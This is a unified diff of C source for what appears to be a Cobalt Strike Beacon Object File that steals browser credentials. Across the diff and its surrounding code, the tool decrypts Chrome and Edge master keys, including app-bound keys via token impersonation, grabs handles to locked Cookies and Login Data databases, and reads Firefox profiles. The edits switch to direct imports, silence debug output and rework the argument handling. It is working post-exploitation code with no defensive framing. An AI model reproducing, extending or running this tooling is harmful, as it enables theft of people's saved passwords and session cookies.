@@ -47,8 +47,8 @@ WINBASEAPI DWORD WINAPI KERNEL32$GetFileType(HANDLE hFile);
 WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
 WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
-WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
-WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
+//WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
+//WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
 WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
 //WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
 DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
@@ -73,13 +73,21 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE h
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
 
-#define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
-    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
-    FARPROC srand = Resolver("msvcrt", "srand");\
-    FARPROC time = Resolver("msvcrt", "time");\
-    FARPROC strnlen = Resolver("msvcrt", "strnlen");\
-    FARPROC rand = Resolver("msvcrt", "rand");\
-    FARPROC realloc = Resolver("msvcrt", "realloc");
+DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
+WINBASEAPI BOOL WINAPI SHLWAPI$PathAppendA(LPCSTR pszPath, LPCSTR pszMore);
+WINBASEAPI int __cdecl MSVCRT$rand();
+WINBASEAPI void __cdecl MSVCRT$srand(int initial);
+WINBASEAPI time_t __cdecl MSVCRT$time(time_t *time);
+WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str,size_t _MaxCount);
+//WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
+
+// #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
+//     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
+//     FARPROC srand = Resolver("msvcrt", "srand");\
+//     FARPROC time = Resolver("msvcrt", "time");\
+//     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
+//     FARPROC rand = Resolver("msvcrt", "rand");\
+//     FARPROC realloc = Resolver("msvcrt", "realloc");
 #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
 #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
 #define DATA_FREE(d, l) \
@@ -88,27 +96,28 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_
         intFree(d); \
         d = NULL; \
     }
+
 #define CSIDL_LOCAL_APPDATA 0x001c
 #define CSIDL_APPDATA 0x001a
 static char* supported_browsers[] = {"chrome", "msedge", "firefox"};
 
 //workaround for no slot for function (reduce number of Win32 APIs called) 
-FARPROC Resolver(CHAR *lib, CHAR *func) {
-    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
-    return ptr;
-}
+// FARPROC Resolver(CHAR *lib, CHAR *func) {
+//     FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
+//     return ptr;
+// }
 
 CHAR *GetFileContent(CHAR *path) {
     CHAR fullPath[MAX_PATH];
     HANDLE hFile = NULL;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //get appdata local path and append path 
     if (path[0] == '\\') {
         BeaconPrintf(CALLBACK_OUTPUT,"[+] Appending local app data path");
         CHAR appdata[MAX_PATH];
-        SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
-        PathAppend(appdata, path);
+        SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
+        SHLWAPI$PathAppendA(appdata, path);
         MSVCRT$strncpy(fullPath, appdata, MAX_PATH);
     } else {
         MSVCRT$strncpy(fullPath, path, MAX_PATH);
@@ -170,7 +179,7 @@ CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
 VOID GetMasterKey(CHAR *key) {
     Buffer result = {0};
     DWORD dwOut = 0;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //calculate size of key
     if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL)) {
@@ -187,7 +196,7 @@ VOID GetMasterKey(CHAR *key) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT,"[+] decrypted base64 %s\n", result.data);
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] decrypted base64 %s\n", result.data);
     if (dwOut < 5 || MSVCRT$memcmp(result.data, "DPAPI", 5) != 0) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Invalid DPAPI Prefix\n");
         return;
@@ -210,7 +219,7 @@ VOID GetMasterKey(CHAR *key) {
     for(i = 0; i < final.cbData; i++) {
         MSVCRT$sprintf(output, "%s\\x%02x", output, final.pbData[i]);
     }
-    BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypted Key: %s \n", output );
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] Master Key (v10): %s \n", output );
 
     // rewind to the start of the buffer
     KERNEL32$GlobalFree(output);
@@ -410,8 +419,10 @@ VOID GetEncryptionKey(char * browser) {
 
     CHAR pattern[] = "\"encrypted_key\":\"";
     key = ExtractKey(app_data, pattern);
+
     CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
     app_key = ExtractKey(app_data, app_pattern);
+
     if(key != NULL) {
         GetMasterKey(key);
     } else {
@@ -437,17 +448,17 @@ VOID GetEncryptionKey(char * browser) {
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
     CHAR *appdata = NULL;
     CHAR *tempProfile = NULL;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
     // create temp var to hold profile
     tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MSVCRT$strlen(profile) + 1);
     MSVCRT$strncpy(tempProfile, profile, MSVCRT$strlen(profile)+1);
     appdata = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MAX_PATH + 1);
 
     //get appdata local path and append path to file
-    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
     file = MSVCRT$strncat(tempProfile, file, MSVCRT$strlen(file)+1);
-    PathAppend(appdata, "\\Mozilla\\Firefox\\Profiles");
-    PathAppend(appdata, file);
+    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\Profiles");
+    SHLWAPI$PathAppendA(appdata, file);
     KERNEL32$GlobalFree(tempProfile);
 
     return appdata;
@@ -457,11 +468,11 @@ VOID GetFirefoxInfo() {
     //get firefox key
     CHAR appdata[MAX_PATH];
     HANDLE hFile = NULL;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //get appdata local path and append path 
-    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
-    PathAppend(appdata, "\\Mozilla\\Firefox\\profiles.ini");
+    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\profiles.ini");
     //BeaconPrintf(CALLBACK_OUTPUT,"Firefox profile info be at: %s \n", appdata );
 
     //get handle to appdata
@@ -685,7 +696,7 @@ VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPa
 }
 
 BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
     
     //BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
     //BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);
@@ -825,18 +836,18 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
 // nanodump fileless download
 BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength)
 {
-    IMPORT_RESOLVE;
-    int fileNameLength = strnlen(fileName, 256);
+    //IMPORT_RESOLVE;
+    int fileNameLength = MSVCRT$strnlen(fileName, 256);
 
     // intializes the random number generator
     time_t t;
-    srand((unsigned) time(&t));
+    MSVCRT$srand((unsigned) MSVCRT$time(&t));
 
     // generate a 4 byte random id, rand max value is 0x7fff
     ULONG32 fileId = 0;
-    fileId |= (rand() & 0x7FFF) << 0x11;
-    fileId |= (rand() & 0x7FFF) << 0x02;
-    fileId |= (rand() & 0x0003) << 0x00;
+    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
+    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
+    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;
 
     // 8 bytes for fileId and fileLength
     int messageLength = 8 + fileNameLength;
@@ -1068,7 +1079,7 @@ BOOL StealAndImpersonate(int pid) {
 }
 
 BOOL AppBoundDecryptor(char * localStateFile, int pid){
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
     // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
@@ -1083,15 +1094,15 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
     char* app_key = ExtractKey(app_data, app_pattern);
 
-
-    BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypted Key %s\n", v10_key);
-    BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypt Appboundkey %s\n", app_key);
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypted Key %s\n", v10_key);
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypt Appboundkey %s\n", app_key);
 
     if (v10_key != NULL) {
         // Decrypt V10 Encryption Key
         if (StealAndImpersonate(pid)) {
             GetMasterKey(v10_key);
             ADVAPI32$RevertToSelf();
+            BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
         } else {
             return FALSE;
         }
@@ -1136,7 +1147,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     MSVCRT$free(encrypted_key_with_header);
 
     // First, attempt to decrypt as SYSTEM
-    BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to decrypt key as SYSTEM...\n");
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to decrypt key as SYSTEM...\n");
 
     BYTE* decrypted_key = NULL;
     DWORD decrypted_key_len = 0;
@@ -1153,7 +1164,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     
     BOOL result = CRYPT32$CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
     if (result) {
-        BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to impersonate user to decrypt...\n");
+        //BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to impersonate user to decrypt...\n");
         
         // Impersonate the user
         hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
@@ -1211,7 +1222,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
             return FALSE;
         }
         
-        BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully decrypted key as impersonated user!\n");
+        //BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully decrypted key as impersonated user!\n");
     } else {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt key as SYSTEM!\n");
         MSVCRT$free(encrypted_key);
@@ -1289,13 +1300,13 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     
         // if first byte is 03 then decyrpt with CNG
         if (key_blob[0] == 0x03) {
-            BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypting key with CNG...");
+            //BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypting key with CNG...");
             BYTE* aes_encrypted_key = key_blob + 1;  // skip flag
             DWORD cng_out_len = 0;
             BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
             if (decrypted) {
                 CHAR *chromeOutput = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
-                BeaconPrintf(CALLBACK_OUTPUT,"[+] CNG Decryption Output (%lu bytes):\n", cng_out_len);
+                //BeaconPrintf(CALLBACK_OUTPUT,"[+] CNG Decryption Output (%lu bytes):\n", cng_out_len);
                 
                 for (DWORD i = 0; i < cng_out_len; i++) {
                     MSVCRT$sprintf(chromeOutput, "%s\\x%02x", chromeOutput, decrypted[i]);
@@ -1318,7 +1329,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
             MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
         }
          
-        BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypt Key: %s \n", output );
+        BeaconPrintf(CALLBACK_OUTPUT,"[+] App-Bound Key: %s \n", output );
     
     
     // Clean up
@@ -1356,122 +1367,178 @@ BOOL ConstructDbPath(char* dest, size_t dest_size, const char* browser, const ch
 VOID go(char *buf, int len) {
     //parse command line arguements
     datap parser;
-    char* browser = "";
-    char* browser_path = "";
-    char* copyFile = "";
-    int browser_pid, cookie_pid, password_pid;
-    BOOL cookies, passwords, keys;
-
+    int chrome = 0;
+    int edge = 0; 
+    int system = 0;
+    int firefox = 0;
+    int chromeCookiesPID = 0;
+    int chromeLoginDataPID = 0;
+    int edgeCookiesPID = 0;
+    int edgeLoginDataPID = 0;
+    int pid = 0; 
+    int keyOnly = 0;
+    int cookieOnly = 0;
+    int loginDataOnly = 0;
+    char * copyFile = "";
+    char * localStateFile = "";
+    
     BeaconDataParse(&parser, buf, len);
-    browser = BeaconDataExtract(&parser, NULL);
-    browser_path = BeaconDataExtract(&parser, NULL);
-    browser_pid = BeaconDataInt(&parser);
-    cookies = BeaconDataInt(&parser);
-    passwords = BeaconDataInt(&parser);
-    keys = BeaconDataInt(&parser);
-    cookie_pid = BeaconDataInt(&parser);
-    password_pid = BeaconDataInt(&parser);
-    BOOL AllBrowsers = FALSE;
 
-    if (cookie_pid != 0 || password_pid != 0) {
-        if (MSVCRT$strlen(browser) == 0) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Please specify which browser to use (chrome or msedge)\n");
+    chrome = BeaconDataInt(&parser);
+    edge = BeaconDataInt(&parser);
+    system = BeaconDataInt(&parser);
+    firefox = BeaconDataInt(&parser);
+    chromeCookiesPID = BeaconDataInt(&parser);
+    chromeLoginDataPID = BeaconDataInt(&parser);
+    edgeCookiesPID = BeaconDataInt(&parser);
+    edgeLoginDataPID = BeaconDataInt(&parser);
+    pid = BeaconDataInt(&parser);
+    localStateFile = BeaconDataExtract(&parser, NULL);
+    keyOnly = BeaconDataInt(&parser);
+    cookieOnly = BeaconDataInt(&parser);
+    loginDataOnly = BeaconDataInt(&parser);
+    copyFile = BeaconDataExtract(&parser, NULL);
+
+    BOOL status = FALSE;
+
+    if (chrome == 1 ){
+        BeaconPrintf(CALLBACK_OUTPUT, "CHROME SELECTED");
+        if (keyOnly == 1){
+            BeaconPrintf(CALLBACK_OUTPUT, "KEY ONLY SELECTED");
+            GetEncryptionKey("chrome");
             return;
         }
-        if (!isBrowserSupported(browser)) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Browser %s is currently not supported, if its chromium based try browser path\n", browser);
+        if (cookieOnly == 1 || loginDataOnly == 1){
+            BeaconPrintf(CALLBACK_OUTPUT, "COOKIES ONLY SELECTED");
+            GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
             return;
         }
-        char dbCookies[20];
-        char dbPasswords[20];
-        if (!ConstructDbPath(dbCookies, sizeof(dbCookies), browser, "Cookies") ||
-            !ConstructDbPath(dbPasswords, sizeof(dbPasswords), browser, "Passwords")) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to construct database paths");
-            return;
-        }
-        if (keys && passwords && cookies) {
-            GetEncryptionKey(browser);
-            GetBrowserFile(password_pid, "Login Data", dbPasswords, copyFile);
-            GetBrowserFile(cookie_pid, "Cookies", dbCookies, copyFile);
-            return;
-        }
-        //if cookie or login data only or keys, then get the cookies and/or passwords and exit
-        if (keys){
-            GetEncryptionKey(browser);
-            return;
-        } else if (passwords) {
-            GetBrowserFile(password_pid, "Login Data", dbPasswords, copyFile);
-            return;
-        } else {
-            GetBrowserFile(cookie_pid, "Cookies", dbCookies, copyFile);
-            return;
-        }
+        GetEncryptionKey("chrome");
+        GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
+        
+        return;
     }
-
-
-    if (MSVCRT$strlen(browser) == 0) {
-        if (browser_path != NULL && MSVCRT$strlen(browser_path) > 0) {
-            if (browser_pid == 0) {
-                BeaconPrintf(CALLBACK_ERROR, "[!] Browser Pid is require for Impersonation");
-                return;
+    else if (edge == 1 ){
+        BeaconPrintf(CALLBACK_OUTPUT, "EDGE SELECTED");
+        if (keyOnly == 1){
+            GetEncryptionKey("msedge");
+            return;
+        }
+        if (cookieOnly == 1 || loginDataOnly == 1){
+            GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
+            return;
+        }
+        GetEncryptionKey("msedge");
+        GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
+        return;
+    }
+    else if (system == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "SYSTEM SELECTED");
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            AppBoundDecryptor(localStateFile, pid);
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (cookieOnly == 1 || loginDataOnly == 1){
+            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "Getting Chrome Cookies and Passwords");
+                GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
             }
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Using browser path: %s and pid %d", browser_path, browser_pid);
-            //if key only, then get the key and exit
-            if (keys) {
-                AppBoundDecryptor(browser_path, browser_pid);
-                return;
+            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "Getting Edge Cookies and Passwords");
+                GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
             }
-            //if cookie or login data only, then get the cookies and/or passwords and exit
-            if (cookies || passwords) {
-                if (SHLWAPI$StrStrIA(browser_path, "chrome") != NULL) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Getting Chrome Cookies and Passwords");
-                    GetBrowserData("chrome", cookies, passwords, copyFile);
-                }
-                if (SHLWAPI$StrStrIA(browser_path, "edge") != NULL) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Getting Edge Cookies and Passwords");
-                    GetBrowserData("msedge", cookies, passwords, copyFile);
-                }
+            return;
+        }
+        
+        if(AppBoundDecryptor(localStateFile, pid)){
+            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "Getting Chrome Cookies and Passwords");
+                GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
             }
-            BeaconPrintf(CALLBACK_OUTPUT, "We didn't choose ;(");
-            return;
-        }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Dumping all supported browsers");
-        for (int i = 0; i < sizeof(supported_browsers) / sizeof(supported_browsers[0]); i++) {
-            browser = supported_browsers[i];
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Going for browser %s", browser);
-            if (MSVCRT$strcmp(browser, "firefox") == 0){
-                GetFirefoxInfo();
-                continue;
+            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "Getting Edge Cookies and Passwords");
+                GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
             }
-            GetEncryptionKey(browser);
-            GetBrowserData(browser, cookies, passwords, copyFile);
         }
-    } else {
-        if (!isBrowserSupported(browser)) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Browser %s is currently not supported, if its chromium based try browser path\n", browser);
+        return;
+    }
+    else if (firefox == 1 ){
+        BeaconPrintf(CALLBACK_OUTPUT, "FIREFOX SELECTED");
+        GetFirefoxInfo();
+        return;
+    }
+    else if (chromeCookiesPID == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "CHROME Cookies SELECTED");
+        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("chrome");
             return;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Going for browser %s", browser);
-        // Firefox Only
-        if (MSVCRT$strcmp(browser, "firefox") == 0){
-            GetFirefoxInfo();
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (cookieOnly == 1){
+            GetBrowserFile(pid, "Cookies", "ChromeCookies.db", copyFile);
             return;
         }
-
-        // Get Key Only
-        if (keys){
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] KEY ONLY SELECTED");
-            GetEncryptionKey(browser);
+        GetEncryptionKey("chrome");
+        GetBrowserFile(pid, "Cookies", "ChromeCookie.db", copyFile);
+        return;
+    }
+    else if (chromeLoginDataPID == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "CHROME Login Data SELECTED");
+        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("chrome");
             return;
         }
-        // Get Login/Cookie (Without Decryption)
-        if (cookies || passwords){
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] COOKIES/PASSWORDS ONLY SELECTED");
-            GetBrowserData(browser, cookies, passwords, copyFile);
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (loginDataOnly == 1){
+            GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
             return;
         }
-        // Get All
-        GetEncryptionKey(browser);
-        GetBrowserData(browser, cookies, passwords, copyFile);
+        GetEncryptionKey("chrome");
+        GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
+        return;
+    }
+    else if (edgeCookiesPID == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "EDGE Cookies SELECTED");
+        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("msedge");
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (cookieOnly == 1){
+            GetBrowserFile(pid, "Cookies", "EdgeCookies.db", copyFile);
+            return;
+        }
+        GetEncryptionKey("msedge");
+        GetBrowserFile(pid, "Cookies", "EdgeCookie.db", copyFile);
+        return;
+    }
+    else if (edgeLoginDataPID == 1){
+        BeaconPrintf(CALLBACK_OUTPUT, "EDGE Login Data SELECTED");
+        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("msedge");
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (loginDataOnly == 1){
+            GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
+            return;
+        }
+        GetEncryptionKey("msedge");
+        GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
+        return;
+    }
+    else{
+        BeaconPrintf(CALLBACK_ERROR,"NOTHING SELECTED");
+        return;
     }
 }
